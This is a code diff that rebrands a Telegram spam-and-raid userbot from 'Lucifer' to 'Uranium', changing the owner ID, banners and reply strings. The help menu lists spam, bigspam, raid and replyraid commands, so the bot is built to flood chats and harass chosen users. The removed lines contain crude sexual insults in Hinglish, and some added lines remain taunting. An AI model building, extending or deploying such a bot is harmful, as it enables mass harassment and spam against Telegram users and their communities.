@@ -73,7 +73,7 @@ put = ""
 
 que = {}
 
-SMEX_USERS = [5046719296]
+SMEX_USERS = [5267349380]
 for x in SUDO_USERS: 
     SMEX_USERS.append(x)
     
@@ -833,7 +833,7 @@ async def _(e):
             event = await e.reply(text, parse_mode=None, link_preview=None )
             try:
                 await e.client(functions.channels.JoinChannelRequest(channel=bc))
-                await event.edit("𝐆𝐀𝐀𝐍𝐃 𝐌𝐈𝐋 𝐆𝐘𝐀𝐀 𝐁𝐇𝐀𝐈𝐈 💋💦")
+                await event.edit("⚔️ 𝗔𝗥𝗠𝗬 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 𝗝𝗢𝗜𝗡𝗘𝗗 ✅")
             except Exception as e:
                 await event.edit(str(e))   
         else:
@@ -877,7 +877,7 @@ async def _(e):
             event = await e.reply(text, parse_mode=None, link_preview=None )
             try:
                 await e.client(ImportChatInviteRequest(bc))
-                await event.edit("PRIVATE RAKHEGA BHENXHOD 👿")
+                await event.edit("⚔️ 𝐀𝐑𝐌𝐘 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐉𝐎𝐈𝐍𝐄𝐃 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 ✅")
             except Exception as e:
                 await event.edit(str(e))   
         else:
@@ -917,7 +917,7 @@ async def _(e):
         if len(e.text) == 7:
             bc = yukki[0]
             bc = int(bc)
-            text = "𝐉𝐀𝐀 𝐌𝐀𝐃𝐀𝐑𝐗𝐇𝐎𝐃 𝐗𝐇𝐎𝐑 𝐃𝐈𝐘𝐀💋"
+            text = "⚔️ 𝘼𝙍𝙈𝙔 𝙎𝙐𝘾𝘾𝙀𝙎𝙁𝙐𝙇𝙇𝙔 𝙇𝙀𝘼𝙑𝙀𝘿 ✅"
             event = await e.reply(text, parse_mode=None, link_preview=None )
             try:
                 await event.client(LeaveChannelRequest(bc))
@@ -1274,7 +1274,7 @@ async def _(e):
             qeue = que.get(g)
             appendable = [g]
             qeue.append(appendable)
-            text = "𝐀𝐀𝐉 𝐓𝐄𝐑𝐈 𝐌𝐀𝐀 𝐗𝐇𝐔𝐃𝐄𝐆𝐈 𝐁𝐄𝐓𝐄⚡"
+            text = "💀 𝑹𝑬𝑷𝑳𝒀𝑹𝑨𝑰𝑫 𝑨𝑪𝑻𝑰𝑽𝑨𝑻𝑬𝑫 𝑶𝑵 𝑴𝒀 𝑺𝑶𝑵 ☠️"
             await e.reply(text, parse_mode=None, link_preview=None )
         else:
             await e.reply(usage, parse_mode=None, link_preview=None )
@@ -1323,7 +1323,7 @@ async def _(e):
                 queue.pop(0)
             except Exception as f:
                 pass
-            text = "𝐗𝐇𝐔𝐃 𝐆𝐀𝐘𝐈 𝐁𝐀𝐂𝐂𝐇𝐈 💦"
+            text = "🔱ʙᴀᴀᴘ sᴇ ᴘᴀɴɢᴀ ɴᴀ ʟᴇɴᴀ ᴀʙᴋɪ ʙᴀᴀʀ🔱"
             await e.reply(text, parse_mode=None, link_preview=None )
         elif e.reply_to_msg_id:             
             a = await e.get_reply_message()
@@ -1334,7 +1334,7 @@ async def _(e):
                 queue.pop(0)
             except Exception as f:
                 pass
-            text = "𝐗𝐇𝐔𝐃 𝐆𝐀𝐘𝐈 𝐁𝐀𝐂𝐂𝐇𝐈 💦"
+            text = "🔱ʙᴀᴀᴘ sᴇ ᴘᴀɴɢᴀ ɴᴀ ʟᴇɴᴀ ᴀʙᴋɪ ʙᴀᴀʀ🔱"
             await e.reply(text, parse_mode=None, link_preview=None )
         else:
             await e.reply(usage, parse_mode=None, link_preview=None )
@@ -1369,11 +1369,11 @@ async def _(e):
 async def ping(e):
     if e.sender_id in SMEX_USERS:
         start = datetime.now()
-        text = "Σ𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆 𝐒𝐏𝐄𝐄𝐃㉺"
+        text = "THE_URANIUM"
         event = await e.reply(text, parse_mode=None, link_preview=None)
         end = datetime.now()
         ms = (end - start).microseconds / 1000
-        await event.edit(f"𒅒𝐒𝐏𝐄𝐄𝐃!\n`{ms}` 𝗺𝘀\n 𒈒 𝐋𝐔𝐂𝐈𝐅𝐄𝐑 𝐒𝐏𝐀𝐌𝐁𝐎𝐓 𒈒")
+        await event.edit(f"🔥🇷 🇦 🇫 🇹 🇦 🇦 🇷🔥!\n`{ms}` 𝗺𝘀\n ⚔️ 𝙐𝙍𝘼𝙉𝙄𝙐𝙈 ✘ 𝙎𝙋𝘼𝙈𝘽𝙊𝙏 ⚔️")
 
      
         
@@ -1483,7 +1483,7 @@ async def restart(e):
 
 async def help(e):
     if e.sender_id in SMEX_USERS:
-       text = " ✡⚔𝐋𝐔𝐂𝐈𝐅𝐄𝐑 𝐒𝐏𝐀𝐌𝐁𝐎𝐓✡⚔\n\n✘ 𝐔𝐓𝐈𝐋𝐒 ✘:\n.ping\n.restart\n\n✘ 𝐔𝐒𝐄𝐑 𝐁𝐎𝐓 ✘:\n.bio\n.join\n.pjoin\n.pleave\n\n✘ 𝐒𝐏𝐀𝐌 ✘:\n.spam\n.delayspam\n.bigspam\n.raid\n.replyraid\n.dreplyraid\n\n\n[•𝐋𝐔𝐂𝐈𝐅𝐄𝐑•](https://t.me/GodLuciferOp)"
+       text = " ✡⚔⚔️𝙐𝙍𝘼𝙉𝙄𝙐𝙈 ✘ 𝙎𝙋𝘼𝙈𝘽𝙊𝙏 ⚔️✡⚔\n\n✘ ＵＴＩＬＳ ✘:\n.ping\n.restart\n\n✘ 𝐔𝐒𝐄𝐑 𝐁𝐎𝐓 ✘:\n.bio\n.join\n.pjoin\n.pleave\n\n✘ 𝐒𝐏𝐀𝐌 ✘:\n.spam\n.delayspam\n.bigspam\n.raid\n.replyraid\n.dreplyraid\n\n\n[•𝐓𝐇𝐄 𝐔𝐑𝐀𝐍𝐈𝐔𝐌•](https://t.me/ABOUT_THE_URANIUM)"
        await e.reply(text, parse_mode=None, link_preview=None )
 
         
@@ -1491,11 +1491,11 @@ async def help(e):
     
         
 text = """
-CONGRATS🥳🥳🥳 YOUR FASTEST, SMOOTHEST AND POWERFUL LEGENDSPAMBOT DEPLOYED SUCCESSFULLY """
+CONGRATS🥳🥳🥳 YOUR FASTEST, SMOOTHEST AND POWERFUL URANIUM SPAMBOT DEPLOYED SUCCESSFULLY """
 
 print(text)
 print("")
-print("YOᑌᖇ ᒪᑌᑕIᖴᗴᖇ Տᑭᗩᗰ ᗷOT ᗪᗴᑭᒪOY !!")
+print("ʏᴏᴜʀ ᴜʀᴀɴɪᴜᴍ sᴘᴀᴍʙᴏᴛ ᴅᴇᴘʟᴏʏ!!")
 if len(sys.argv) not in (1, 3, 4):
     try:
         idk.disconnect()
